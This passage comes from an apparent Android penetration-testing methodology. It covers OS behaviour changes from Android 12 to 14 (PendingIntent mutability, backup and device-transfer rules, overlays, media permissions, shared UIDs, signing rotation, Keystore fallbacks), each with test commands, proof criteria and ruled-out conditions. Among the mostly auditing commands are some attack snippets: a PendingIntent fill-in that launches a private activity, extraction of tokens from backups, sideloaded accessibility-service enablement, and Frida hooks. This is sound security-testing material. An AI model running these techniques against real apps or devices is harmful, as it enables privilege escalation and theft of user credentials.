  git log --oneline -S 'android:exported="true"' -- '*AndroidManifest.xml'
  ```
- **Proof:** A component that renders authenticated content or transitions state when launched by
  `am start` as the shell UID, plus its `android:exported="true"` line and the absence of any
  `android:permission` on it.
- **Escalation:** -> D04 exported activity / UI redress; -> D06 bound service; -> D08 if it forwards its
  extras; -> D05 if it is a receiver.
- **Ruled out when:** Every `exported="true"` component either carries an `android:permission` with a
  `signature`-level protection level, or is proved inert by exercising it from the shell and observing
  no state change and no data returned. Enumerate the list and record the per-component result; a count
  of zero exported components on a targetSdk-31+ app is itself a valid negative because the attribute is
  mandatory, so absence of `exported="true"` means every filtered component is explicitly `false`.

### D22-012 · PendingIntent mutability mandate made the flag explicit, not safe

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the reachable internal component performs a privileged action; otherwise `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 (holder of the PendingIntent); AM-04 for the notification-listener acquisition path |
| **Applies to** | targetSdk >= 31 for the mandate; see D22-032 for the targetSdk-34 variant and D22-070 for the pre-31 default |
| **Maps to** | MASTG-TEST-0381 (References to Insecure PendingIntent Creation), MASTG-KNOW-0024, rule `mastg-android-pendingintent-mutable`; `about/versions/12/behavior-changes-12` (mutability mandate, lint `UnspecifiedImmutableFlag`); `privacy-and-security/risks/pending-intent`; CWE-927; ATT&CK T1626 |

- **Test:** Android 12 forces an explicit `FLAG_IMMUTABLE` or `FLAG_MUTABLE`. It does not stop a
  developer choosing `FLAG_MUTABLE`. A mutable PendingIntent whose base intent lacks a component lets
  the holder call `fillIn()` and direct it at a **non-exported** component, executing with the creator's
  UID and permissions. The mandate's real effect on a modern app is that `FLAG_MUTABLE` is now a typed
  decision you can quote.
- **How:**
  ```bash
  grep -rn 'FLAG_MUTABLE' out/sources/
  grep -rnE 'PendingIntent\.get(Activity|Broadcast|Service|ForegroundService)\(' out/sources/ -A4
  grep -rnE 'FLAG_MUTABLE|FLAG_IMMUTABLE|FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT|FLAG_ONE_SHOT' out/sources/
  ```
  For each `FLAG_MUTABLE` hit, read the `Intent` construction: does it call `setClassName`,
  `setComponent` or `setPackage`? If not, the component is fillable. Attacker side, once you hold it
  (notification action, widget, `EXTRA_RESULT_RECEIVER`-style handoff):
  ```java
  Intent fill = new Intent();
  fill.setClassName("com.target.app", "com.target.app.internal.AdminActivity");
  pi.send(ctx, 0, fill);      // executes as the creator
  ```
- **Proof:** The victim's non-exported activity on top of the stack —
  `adb shell dumpsys activity activities | grep AdminActivity` — plus the victim's own logs showing the
  action performed under its UID.
- **Escalation:** -> D08 PendingIntent chapter for the full acquisition and fill-in matrix; -> D15 for
  the privileged backend action performed as the victim.
- **Ruled out when:** Every `PendingIntent.get*` call site uses `FLAG_IMMUTABLE`, or every `FLAG_MUTABLE`
  site constructs its base intent with an explicit `setComponent`/`setClassName` in the same method from
  a literal class reference. Enumerate the call sites and record the flag and the base-intent shape for
  each.

### D22-013 · `adb backup` excluded at targetSdk 31 — and the `android:debuggable` escape hatch

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the extracted token authenticates to an internet-facing API; the backup misconfiguration alone is `mobile_security_misconfiguration.auto_backup_allowed_by_default` (P5) |
| **Attacker** | AM-11 physical unlocked (USB debugging authorised) |
| **Applies to** | targetSdk >= 31 for the exclusion; `android:debuggable` matters at every level |
| **Maps to** | `about/versions/12/behavior-changes-12` ("`adb backup` excludes app data for apps targeting Android 12; opt-in by setting `android:debuggable="true"`… Must set to false before release"); `privacy-and-security/risks/android-debuggable`; MASTG-TECH-0128 (Performing a Backup and Restore of App Data); MASVS-STORAGE |

- **Test:** From targetSdk 31, `adb backup` returns nothing for the app **unless** the manifest carries
  `android:debuggable="true"`. So on a modern target, a working `adb backup` is not a backup finding — it
  is proof the release build shipped debuggable, which additionally hands you `run-as` and JDWP.
- **How:**
  ```bash
  aapt2 dump badging base.apk | grep -i debuggable        # 'application-debuggable'
  adb shell dumpsys package com.target.app | grep -i DEBUGGABLE
  adb backup -f /tmp/b.ab -noapk com.target.app && ls -l /tmp/b.ab
  dd if=/tmp/b.ab bs=24 skip=1 2>/dev/null | zlib-flate -uncompress | tar tvf - | head -40
  adb shell run-as com.target.app ls -la /data/data/com.target.app    # succeeds only if debuggable
  ```
- **Proof:** `application-debuggable` in the badging output, plus a non-trivial `.ab` whose extracted tar
  contains `shared_prefs/*.xml` or `databases/*.db` carrying a token — and the token then used against
  the API from `curl`.
- **Escalation:** -> D11 storage; -> D13 session takeover from the extracted token; the debuggable flag
  itself -> D21 (every RASP check is trivially hooked over JDWP).
- **Ruled out when:** `targetSdk >= 31`, badging reports no `application-debuggable`, and `adb backup`
  produces a header-only `.ab` (record the byte size) while `run-as` returns
  `run-as: package not debuggable`. Those three together are the mechanism.

### D22-014 · `<device-transfer>` omitted from `dataExtractionRules` — D2D transfers what cloud backup excludes

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the transferred material is a live credential; otherwise rated on the data |
| **Attacker** | AM-11 (attacker performing a "restore to new phone" onto a device they control) |
| **Applies to** | targetSdk >= 31 (Android 12+); apps must ship **both** `android:fullBackupContent` (for Android 11 devices) and `android:dataExtractionRules` |
| **Maps to** | `about/versions/12/behavior-changes-12` ("XML include/exclude rules don't affect D2D transfers"; `android:dataExtractionRules`); `guide/topics/data/autobackup` (domains `root`, `file`, `database`, `sharedpref`, `external`, `device_root`, `device_file`, `device_database`, `device_sharedpref`; `<exclude>` takes precedence over `<include>`; no regex, no `..`); `risks/backup-best-practices`; MASTG-TEST-0262 |

- **Test:** Android 12 split backup into `<cloud-backup>` and `<device-transfer>` (with
  `<cross-platform-transfer>` added in Android 16 QPR2). The documented trap: **if `<device-transfer>` is
  not set, all application data transfers during D2D migration.** An app that carefully excludes an auth
  file from `<cloud-backup>` and omits `<device-transfer>` still ships that file to the new device.
  `android:allowBackup="false"` disables cloud backup to Google Drive but may not disable device-to-device
  transfer, which varies by manufacturer.
- **How:**
  ```bash
  grep -nE 'allowBackup|fullBackupContent|dataExtractionRules' out/AndroidManifest.merged.xml
  cat out/res/xml/data_extraction_rules.xml out/res/xml/backup_rules.xml 2>/dev/null
  grep -nE 'disableIfNoEncryptionCapabilities|requireFlags|clientSideEncryption|deviceToDeviceTransfer' out/res/xml/*.xml
  grep -rnE 'FLAG_CLIENT_SIDE_ENCRYPTION_ENABLED|FLAG_DEVICE_TO_DEVICE_TRANSFER|onFullBackup|onRestoreFinished|BackupAgent' out/sources/
  ```
  Then locate the secret in the file the rules claim to protect:
  ```bash
  adb shell run-as com.target.app cat shared_prefs/auth.xml 2>/dev/null | head
  ```
- **Proof:** A `data_extraction_rules.xml` whose `<cloud-backup>` excludes `sharedpref` `auth.xml` while
  `<device-transfer>` is absent or omits the same exclusion, corroborated by locating a live token in
  that file. Where the rules file is present but neither
  `<cloud-backup disableIfNoEncryptionCapabilities="true">` nor
  `requireFlags="clientSideEncryption"` is used, state that too.
- **Escalation:** -> D11 storage; -> D13 credential material propagating to a device outside the user's
  control.
- **Ruled out when:** Both `<cloud-backup>` and `<device-transfer>` sections exist and exclude the same
  paths, **or** every file under the app's data directory has been enumerated and none contains
  authentication or PII material. Paste the rules file and the enumeration.

### D22-015 · Notification trampoline block (Android 12) and the redesign that replaced it

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | targetSdk >= 31 |
| **Maps to** | `about/versions/12/behavior-changes-12` (trampoline restriction, the logcat string, compat change `NOTIFICATION_TRAMPOLINE_BLOCK`) |

- **Test:** At targetSdk 31 a service or receiver used as a notification trampoline may no longer call
  `startActivity()`. Apps that had a trampoline almost always replaced it with a direct
  `setContentIntent()` PendingIntent — so the interesting question on a modern build is what that
  replacement looks like: is it mutable, and does it point at an intent-forwarding activity?
- **How:**
  ```bash
  adb logcat -d | grep -i 'Indirect notification activity start (trampoline) from'
  adb shell am compat enable NOTIFICATION_TRAMPOLINE_BLOCK com.target.app
  grep -rn 'setContentIntent(' out/sources/ -A4
  grep -rn 'setContentIntent(' out/sources/ -B6 | grep -n 'FLAG_MUTABLE'
  ```
- **Proof:** On a low-target build, the trampoline logcat string. On the modern build, a
  `setContentIntent` PendingIntent that is `FLAG_MUTABLE` or whose target activity is a redirector
  (reads `EXTRA_INTENT`/`getParcelableExtra` and forwards it).
- **Escalation:** -> D24 push -> D04 activity launch; the mutable case is D22-012 / D08.
- **Ruled out when:** Every `setContentIntent` PendingIntent is `FLAG_IMMUTABLE` with an explicit
  component, and no service or receiver in the app calls `startActivity` from a notification action
  handler. Record the call-site list.

### D22-016 · Untrusted-touch blocking (Android 12) — check whether the app is the one being let through

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `mobile_security_misconfiguration.tapjacking` (P5) — must chain to be reportable |
| **Attacker** | AM-04 (overlay app holding `SYSTEM_ALERT_WINDOW`) |
| **Applies to** | device API >= 31 for the block; `setHideOverlayWindows`/`HIDE_OVERLAY_WINDOWS` available API 31+; `android:accessibilityDataSensitive` from Android 16 |
| **Maps to** | MASTG-TEST-0340 (References to Overlay Attack Protections); `developer.android.com/.../tapjacking` (background custom toasts blocked at Android 11/API 30; toast-burst mitigated at Android 12/API 31; touches from a non-trusted overlay of another UID blocked for full occlusion at API 31 with the opacity >= 0.8 caveat; `Window.setHideOverlayWindows(true)` API 31+; `android:accessibilityDataSensitive` Android 16) |

- **Test:** Android 12 drops touches that pass through another UID's overlay window above the documented
  opacity threshold, which kills the classic tapjacking PoC on modern devices. Two things remain
  testable: whether the *overlay opacity* stays under the threshold (so touches still pass), and whether
  the victim app uses `setHideOverlayWindows(true)` on its sensitive screens — the platform provides the
  control, the app has to call it.
- **How:**
  ```bash
  grep -rnE 'setHideOverlayWindows|HIDE_OVERLAY_WINDOWS|setFilterTouchesWhenObscured|filterTouchesWhenObscured|accessibilityDataSensitive' out/sources/ out/res/ out/AndroidManifest.merged.xml
  adb shell am compat enable  BLOCK_UNTRUSTED_TOUCHES com.attacker.overlay
  adb shell am compat disable BLOCK_UNTRUSTED_TOUCHES com.attacker.overlay
  adb logcat -d | grep -E 'Untrusted touch due to occlusion by'
  ```
- **Proof:** The `Untrusted touch due to occlusion by` line absent while your overlay is on screen and
  the victim's confirm button still receives the tap — combined with the victim's consent screen
  carrying no `setHideOverlayWindows` and no `filterTouchesWhenObscured`.
- **Escalation:** P5 alone. It only becomes reportable when the obscured control performs a state change
  the user did not intend — take it to D23 payments or D13 consent, and file it there.
- **Ruled out when:** The sensitive activity calls `setHideOverlayWindows(true)` in `onResume` (or sets
  `filterTouchesWhenObscured` on the confirm control) and the `Untrusted touch` line fires under your
  overlay on an API 31+ device. Record both.

### D22-017 · BouncyCastle removed in Android 12 — find the bundled provider re-registered at priority 1

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insufficient_entropy.initialization_vector_reuse` (P5) for the GCM-nonce case standalone; `cryptographic_weakness.broken_cryptography.use_of_broken_cryptographic_primitive` (P3) where the restored parameters break the primitive |
| **Attacker** | AM-08 / AM-09 (whoever can obtain two ciphertexts under the reused nonce) |
| **Applies to** | Android 12+ (API 31); BouncyCastle JCA provider deprecated at API 28 and removed at API 31; `Crypto` provider deprecated API 24, removed API 28; specifying a provider in `getInstance` fails for apps targeting API 28+ |
| **Maps to** | MASTG-TEST-0312 (References to Explicit Security Provider in Cryptographic APIs), MASWE-0046 (Use of Deprecated APIs or Functionality — CWE-327, CWE-477, CWE-522), MASTG-KNOW-0046 (BouncyCastle KeyStore); `about/versions/12/behavior-changes-all` (BouncyCastle removed in favour of Conscrypt; 512-bit AES unsupported; invalid `KeyGenerator` key sizes rejected; "GCM ciphers initialized with non-12-byte sizes" rejected); `risks/broken-cryptographic-algorithm` |

- **Test:** Android 12 removed the BouncyCastle implementations in favour of Conscrypt, which rejected
  three things apps were doing: 512-bit AES keys, invalid `KeyGenerator` key sizes, and GCM ciphers
  initialised with a non-12-byte IV. Apps that hit those errors frequently bundled
  `org.bouncycastle:bcprov-*` and re-registered it as a provider — restoring exactly the parameters the
  platform refused. The finding is the deliberate route around a platform crypto check, not the
  deprecation.
- **How:**
  ```bash
  unzip -l base.apk | grep -iE 'bcprov|bouncycastle'
  grep -rnE 'Security\.insertProviderAt|Security\.addProvider|BouncyCastleProvider|getInstance\([^)]*,\s*"BC"\)|"BC"' out/sources/
  grep -rnE 'GCMParameterSpec|IvParameterSpec' out/sources/ -A2 | grep -nE 'new byte\[(8|16|32)\]'
  grep -rnE 'KeyStore\.getInstance\("BKS"\)|KeyGenerator\.getInstance\(' out/sources/ -A3
  ```
- **Proof:** A bundled BC provider inserted at position 1 (`Security.insertProviderAt(new
  BouncyCastleProvider(), 1)`) plus a GCM `init` with a 16-byte IV, or an AES key size the platform
  rejects — i.e. the app deliberately routed around the platform check. For the BKS case, the extracted
  keystore file and the key recovered from it.
- **Escalation:** -> D12 for the ciphertext-integrity consequence; -> D11 if a BKS keystore holds the key
  that protects stored user data (the key is software-protected and extractable from the app's files).
- **Ruled out when:** No `bcprov` in the APK, no `Security.addProvider`/`insertProviderAt` call site, and
  every `Cipher.getInstance` uses the two-argument form without a provider name. Record the grep counts.

### D22-018 · App hibernation and permission auto-reset — a security control that decays

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | none directly; rate on the control that stops working. `insufficient_security_configurability.lack_of_notification_email` (P5) is the closest when the decayed control was the user's alert channel |
| **Attacker** | AM-01 (time, not an actor) |
| **Applies to** | auto-revoke and hibernation from Android 11/12 (API 30/31); runtime permissions API 23+ |
| **Maps to** | ATT&CK T1661 (Application Versioning) for the hibernation-adjacent behaviour, mitigation M1006; `about/versions/12/behavior-changes-all` (app hibernation, permission auto-reset for unused apps) |

- **Test:** The platform resets runtime permissions for unused apps and hibernates them. If the app
  builds a security function on a permission or a background component — a device-binding heartbeat, a
  fraud signal, a security-notification channel — that function decays to nothing after a period of
  non-use, with no user-visible failure. Separately, test that the app **re-checks** its permissions
  after revocation rather than caching the earlier grant.
- **How:**
  ```bash
  adb shell cmd package set-app-hibernation-state com.target.app true 2>/dev/null
  adb shell appops get com.target.app
  adb shell dumpsys package com.target.app | sed -n '/runtime permissions/,/^$/p'
  adb shell pm revoke com.target.app android.permission.CAMERA     # while the app is in the foreground
  # then retry the permission-gated feature without restarting the app
  grep -rnE 'checkSelfPermission|shouldShowRequestPermissionRationale|onRequestPermissionsResult|isAutoRevokeWhitelisted|REQUEST_IGNORE_BATTERY_OPTIMIZATIONS' out/sources/
  ```
- **Proof:** The app performing the permission-gated action after revocation (it cached the grant), or
  the security function silently absent after hibernation with no re-arm on next launch.
- **Escalation:** -> D20 privacy where the cached grant lets the app act against the user's current
  choice; -> D13 where the decayed function was the fraud or alert control.
- **Ruled out when:** Every permission-gated code path calls `checkSelfPermission` immediately before
  use (enumerate the call sites) and the security function re-arms on the first launch after
  hibernation, observed on the Android 12+ image. Record both observations.

### D22-019 · POST_NOTIFICATIONS default-deny suppresses the app's only breach-alert channel

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `insufficient_security_configurability.lack_of_notification_email` (P5) standalone; the chain target is `broken_authentication_and_session_management.authentication_bypass` (P1) where silent takeover is the outcome |
| **Attacker** | AM-04 (an app or a user action that leaves the permission denied) |
| **Applies to** | Android 13+ (API 33). targetSdk 33+ controls when the prompt appears; targetSdk 32 and lower get it automatically on first channel creation |
| **Maps to** | MASTG-TEST-0315 (Sensitive Data Exposed via Notifications); `develop/ui/views/notifications/notification-permission` (`android.permission.POST_NOTIFICATIONS`; off by default for new installs on Android 13+; pre-granted on upgrade only if a channel existed and the user had not disabled notifications; `areNotificationsEnabled()`; exemptions for media-session and call-style notifications) |

- **Test:** On Android 13+ notifications are off by default for new installs. If the app delivers
  security-relevant events — new sign-in, payment authorised, password changed, device added — **only**
  by notification, a user who declined the prompt never sees them, and anyone who can get the permission
  denied or revoked has suppressed the out-of-band alert channel entirely. The finding is the absence of
  a second channel, not the permission.
- **How:**
  ```bash
  adb shell pm revoke com.target.app android.permission.POST_NOTIFICATIONS
  adb shell dumpsys package com.target.app | grep -i POST_NOTIFICATIONS
  grep -rnE 'areNotificationsEnabled|POST_NOTIFICATIONS|NotificationManagerCompat|createNotificationChannel' out/sources/
  ```
  Then perform each sensitive account action (password change, email change, new-device sign-in, large
  transfer) with the permission denied and check for an in-app inbox entry, an email, or an SMS.
- **Proof:** A completed security-relevant state change with the permission denied and no alternative
  delivery channel — the account-activity screen empty, no email in the test mailbox — screenshotted in
  the five-state pattern (pre-state, the action, negative post-state, positive post-state with the
  permission granted, side-effect).
- **Escalation:** -> D13, where suppression of the alert channel converts a detectable takeover into a
  silent one; -> D24 push.
- **Ruled out when:** The same security event produces an email or an in-app record with
  `POST_NOTIFICATIONS` denied. Show the second channel's artefact, not the code that would send it.

### D22-020 · Call-style and media-session exemptions used to post notifications the user declined

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.privilege_escalation` (null) — a permission decision circumvented |
| **Attacker** | AM-08 (an SDK that adds the scaffolding) or the app itself against its own user |
| **Applies to** | Android 13+ for the exemption; Android 14+ for the `CallStyle` exception to the dismissable-ongoing-notification rule |
| **Maps to** | `develop/ui/views/notifications/notification-permission` (call-style and media-session exemptions; `MANAGE_OWN_CALLS` + `ConnectionService` + `registerPhoneAccount()`); `about/versions/13/behavior-changes-all` ("Exception: Media sessions and self-managed phone calls are exempt"); `about/versions/14/behavior-changes-all` (`CallStyle` excepted from the now-dismissable rule) |

- **Test:** Call-style notifications are exempt from `POST_NOTIFICATIONS` when the app implements
  `MANAGE_OWN_CALLS` plus a `ConnectionService` and registers a phone account. A non-calling app that
  builds that scaffolding is using an exemption to post notifications the user explicitly declined — and
  those notifications are also exempt from the Android 14 dismissable rule, so they are persistent.
- **How:**
  ```bash
  grep -nE 'MANAGE_OWN_CALLS|ConnectionService|registerPhoneAccount|CallStyle|MediaSession' out/AndroidManifest.merged.xml
  grep -rnE 'MANAGE_OWN_CALLS|ConnectionService|registerPhoneAccount|Notification\.CallStyle|MediaSessionCompat' out/sources/
  adb shell dumpsys telecom | grep -i 'phone account\|com.target.app'
  adb shell pm revoke com.target.app android.permission.POST_NOTIFICATIONS
  # then trigger the app's notification path and watch the drawer
  ```
- **Proof:** A notification rendered with `POST_NOTIFICATIONS` denied, plus a phone-account registration
  in `dumpsys telecom` for an app with no calling feature, plus the notification proving
  non-dismissable.
- **Escalation:** -> D04 persistent UI / phishing surface; -> D24.
- **Ruled out when:** The app has a genuine calling or media-playback feature that the registration
  serves (name it), or no notification appears once the permission is denied. Record the drawer state.

### D22-021 · Granular media permissions taken instead of the Photo Picker

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null — rated on the data); Critical framing where EXIF GPS is shipped |
| **Attacker** | AM-05 / AM-09 (the app's own backend receives more than the user chose to share) |
| **Applies to** | targetSdk >= 33 for the granular permissions; Photo Picker native on API 30+ and available below via the Play services backport |
| **Maps to** | `about/versions/13/behavior-changes-13` (`READ_MEDIA_IMAGES`/`READ_MEDIA_VIDEO`/`READ_MEDIA_AUDIO` replacing `READ_EXTERNAL_STORAGE`); `training/data-storage/shared/photopicker` ("No permissions are required"; grants last "until the device is restarted or until your app stops"; persistable via `takePersistableUriPermission`; maximum 5,000 media grants per app, additional grants remove the oldest); `about/versions/14/behavior-changes-14` (`READ_MEDIA_VISUAL_USER_SELECTED`); MASTG-KNOW-0042 |

- **Test:** The Photo Picker requires **no permission** and grants URI access to the selected items
  only. An app that instead requests `READ_MEDIA_IMAGES`/`_VIDEO`/`_AUDIO` and enumerates `MediaStore`
  is reading the whole library. Determine whether the broad path is a fallback for old devices or the
  default on modern ones.
- **How:**
  ```bash
  grep -nE 'READ_MEDIA_IMAGES|READ_MEDIA_VIDEO|READ_MEDIA_AUDIO|READ_MEDIA_VISUAL_USER_SELECTED|READ_EXTERNAL_STORAGE' out/AndroidManifest.merged.xml
  grep -rnE 'ACTION_PICK_IMAGES|PickVisualMedia|PickMultipleVisualMedia|isPhotoPickerAvailable' out/sources/
  adb shell pm revoke com.target.app android.permission.READ_MEDIA_IMAGES
  # then use the gallery feature: does it still work through the picker?
  ```
  Hook the enumeration and correlate with the next request body:
  ```javascript
  Java.perform(function () {
    var CR = Java.use('android.content.ContentResolver');
    CR.query.overload('android.net.Uri','[Ljava.lang.String;','android.os.Bundle','android.os.CancellationSignal')
      .implementation = function (u, p, b, c) {
        if (('' + u).indexOf('media') >= 0) console.log('[mediastore] ' + u);
        return this.query(u, p, b, c);
      };
  });
  ```
- **Proof:** The hook showing a `MediaStore.Images` enumeration, followed by a Burp request body
  containing filenames, timestamps or EXIF for images the user never selected — with the counts matching.
- **Escalation:** -> D20 undisclosed collection / data-safety mismatch; -> D07 for the provider side.
- **Ruled out when:** The app declares no `READ_MEDIA_*` permission and every media access goes through
  `PickVisualMedia`, **or** the permission is declared but the app continues to function with it revoked
  (prove by revoking and exercising the feature). Record which.

### D22-022 · `READ_MEDIA_VISUAL_USER_SELECTED` absent at targetSdk 34 — silent compatibility mode

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-05 |
| **Applies to** | targetSdk >= 34 |
| **Maps to** | `about/versions/14/behavior-changes-14` (Selected Photos Access, `READ_MEDIA_VISUAL_USER_SELECTED`, compatibility mode) |

- **Test:** Android 14 Selected Photos Access applies to targetSdk 34+. An app that does not declare
  `READ_MEDIA_VISUAL_USER_SELECTED` runs in compatibility mode, which changes what it sees when the user
  picks "Select photos". The testable question is whether the app's own logic ("the user granted media,
  therefore every URI is trusted") misbehaves in that mode.
- **How:**
  ```bash
  grep -n 'READ_MEDIA_VISUAL_USER_SELECTED' out/AndroidManifest.merged.xml
  adb shell pm grant com.target.app android.permission.READ_MEDIA_VISUAL_USER_SELECTED
  # in the app: choose "Select photos" for a subset, then exercise the gallery feature
  adb shell dumpsys activity permissions | grep -A6 com.target.app
  ```
- **Proof:** The app treating partial access as full access — attempting or succeeding in reading
  non-selected media — or looping the permission request until the user grants full access (a
  dark-pattern re-prompt), captured on video with the selection set visible.
- **Escalation:** -> D20 over-collection; -> D07 if the app resolves URIs it was not granted.
- **Ruled out when:** The permission is declared and the app's media list matches the user's selection
  exactly after a partial grant. Show the selection and the resulting list side by side.

### D22-023 · Restricted Settings for sideloaded apps — state the gate or your severity is wrong

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — a precondition that changes the rating of D13/D20/D21 findings |
| **Attacker** | AM-04 (the attacker app needs the user to clear the gate) |
| **Applies to** | Android 13+ for sideloaded installers |
| **Maps to** | `support.google.com/android/answer/12623953` ("Some of these steps work only on Android 13 and up"; "Allow restricted settings"; "When you enable restricted settings, you allow apps to get access to sensitive info that could put your personal data at risk"); ATT&CK T1426 (the Chameleon family is documented as checking for this) |

- **Test:** Android 13+ blocks a sideloaded app from being granted an accessibility service or
  notification-listener access until the user walks **Settings > Apps > [app] > More > Allow restricted
  settings**. Any PoC of yours that needs either capability must state whether the user had to clear
  that gate and how many taps it took — omitting it inflates the severity and is one of the fastest
  routes to a downgrade. The same fact read forwards is a defence the app under test should be
  recommending to its users.
- **How:**
  ```bash
  adb install -r attacker.apk                       # sideload, then attempt to enable the capability
  adb shell cmd notification allow_listener com.attacker/.Listener
  adb shell settings put secure enabled_accessibility_services com.attacker/.A11y
  adb shell settings get secure enabled_accessibility_services
  # and the app-side defence:
  grep -rnE 'ACCESSIBILITY_ENFORCEMENT_DEFAULT_DENY|accessibilityDataSensitive|AccessibilityManager|getEnabledAccessibilityServiceList' out/sources/ out/res/
  ```
  Note that `adb shell settings put secure` succeeds where the Settings UI would refuse — that is a
  shell-UID result, not an attacker result. Reproduce through the UI on a real device for the report.
- **Proof:** A screen recording of the restricted-settings dialog and a count of the user taps required,
  filed alongside the PoC it gates.
- **Escalation:** -> D27 severity narrative; a PoC that needs this gate cleared is AM-04 with a
  significant interaction cost, not AM-03.
- **Ruled out when:** The PoC needs neither an accessibility service nor notification-listener access —
  say so explicitly — or the app is installed through a channel the gate does not apply to (Play
  install), which you then state.

### D22-024 · `android:sharedUserId` retained past API 32

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null); `insecure_os_firmware.shared_credentials_on_storage` (P3) where the pooled data is credential material |
| **Attacker** | AM-08 (compromise of the weakest member of the shared UID) |
| **Applies to** | all devices; the migration attribute only takes effect for installs on API 33+ |
| **Maps to** | `about/versions/13/behavior-changes-all` (shared user ID deprecation, `android:sharedUserMaxSdkVersion="32"`, "Don't remove `android:sharedUserId` — this breaks updates") |

- **Test:** Shared user ID is deprecated and the documented migration is
  `android:sharedUserMaxSdkVersion="32"` — which severs the pooling for installs on API 33+ while
  keeping updates working on older devices. An app family still pooling into one UID on modern devices
  shares `/data/data`, the Keystore namespace, and every granted permission across every member.
- **How:**
  ```bash
  grep -nE 'sharedUserId|sharedUserMaxSdkVersion' out/AndroidManifest.merged.xml
  adb shell dumpsys package com.target.app | grep -E 'userId=|sharedUser'
  adb shell "ps -A | grep com.target"        # two packages, one uid
  # on a rooted image, prove the cross-read:
  adb shell run-as com.target.app ls -la /data/data/com.other.member/shared_prefs/ 2>&1 | head
  ```
- **Proof:** `dumpsys package` showing the same `userId=` for two packages, plus a read of the sibling's
  `shared_prefs` from the target's context, plus the identity of the weaker sibling (a companion app, a
  demo build, a third-party-maintained package).
- **Escalation:** -> D11/D12 — same UID means the same Keystore namespace, so the sibling's
  Keystore-wrapped blobs are decryptable from the weaker member.
- **Ruled out when:** No `sharedUserId` in the merged manifest, **or** it is present with
  `sharedUserMaxSdkVersion="32"` and `dumpsys package` shows a distinct `userId=` on an API 33+ install.
  Quote both lines.

### D22-025 · APK Signature Scheme v3.1 rotation targeting — two keys, two OS ranges

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) when a signature-protected custom permission resolves to the pre-rotation key |
| **Attacker** | AM-03 on a pre-Android-13 device |
| **Applies to** | Android 13+ signing with v3.1; the split-brain effect lands on Android 12L and lower |
| **Maps to** | MASTG-TEST-0224 (Usage of Insecure APK Signature Version); `about/versions/13/features` (APK Signature Scheme v3.1, `apksigner --rotation-min-sdk-version`, "backward compatible with Android 12L and lower") |

- **Test:** Android 13 added v3.1, which lets a developer rotate signing keys **only for SDK versions at
  or above `--rotation-min-sdk-version`**, leaving the old key authoritative below it. Verify which key
  actually authorises updates and satisfies signature checks on each OS version the app supports —
  `checkSignatures()` peers and `signature`-level custom permissions can resolve to different keys on
  different devices.
- **How:**
  ```bash
  apksigner verify --verbose --print-certs base.apk
  apksigner verify --min-sdk-version 24 --max-sdk-version 32 --print-certs base.apk
  apksigner verify --min-sdk-version 33 --print-certs base.apk
  grep -nE 'protectionLevel="signature|<permission ' out/AndroidManifest.merged.xml
  grep -rnE 'checkSignatures|getPackageInfo\(.*GET_SIGNING_CERTIFICATES|signingInfo' out/sources/
  ```
- **Proof:** Two different certificate digests printed for the two SDK ranges, paired with a
  `signature`-level permission or a peer-signature check that the pre-rotation key satisfies on the
  lower range.
- **Escalation:** -> D03 custom-permission spoofing by a co-signed attacker app on pre-13 devices;
  -> D02 signing chapter.
- **Ruled out when:** `apksigner verify` prints the same certificate digest across every SDK range the
  app supports (paste all three outputs), or the app declares no signature-level permission and performs
  no `checkSignatures` peer check.

### D22-026 · Keystore/KeyMint structured errors swallowed into a software fallback

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) for the resulting file; the chain target is `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the extractable key protects a live token |
| **Attacker** | AM-11 / AM-12 (recovering the key after the downgrade) |
| **Applies to** | Android 13+ (API 33) for the structured errors; the anti-pattern exists at every level |
| **Maps to** | `about/versions/13/features` (Keystore/KeyMint error hierarchy under `java.security.ProviderException`; `KeyStoreException` error codes indicating whether errors are retryable); MASTG-TEST-0307; MASVS-CRYPTO |

- **Test:** Android 13 added structured Keystore/KeyMint error reporting, including whether the failure
  is retryable. The anti-pattern is `catch (Exception e) { useSoftwareFallback(); }` — a single
  transient KeyMint error then permanently downgrades the app to a non-hardware-backed, extractable key.
- **How:**
  ```bash
  grep -rnE 'KeyStoreException|ProviderException|KeyGenParameterSpec|KeyGenerator\.getInstance' out/sources/ -A10 | grep -nE 'catch|fallback|software|SharedPreferences'
  grep -rnE 'setIsStrongBoxBacked|setUnlockedDeviceRequired|setUserAuthenticationRequired' out/sources/
  ```
  Force the failure once and observe the branch:
  ```javascript
  Java.perform(function () {
    var KG = Java.use('javax.crypto.KeyGenerator');
    var thrown = false;
    KG.generateKey.implementation = function () {
      if (!thrown) { thrown = true;
        throw Java.use('java.security.ProviderException').$new('induced KeyMint failure'); }
      return this.generateKey();
    };
  });
  ```
- **Proof:** After a single induced failure, a raw key material blob present in `shared_prefs` or the
  files directory (`adb shell run-as com.target.app grep -rl . shared_prefs files | xargs -I{} sh -c
  'echo {}; head -c 200 {}'`) and still in use on subsequent launches.
- **Escalation:** -> D11 key extraction; -> D12 for the crypto consequence; -> D13 if the key protects a
  session token.
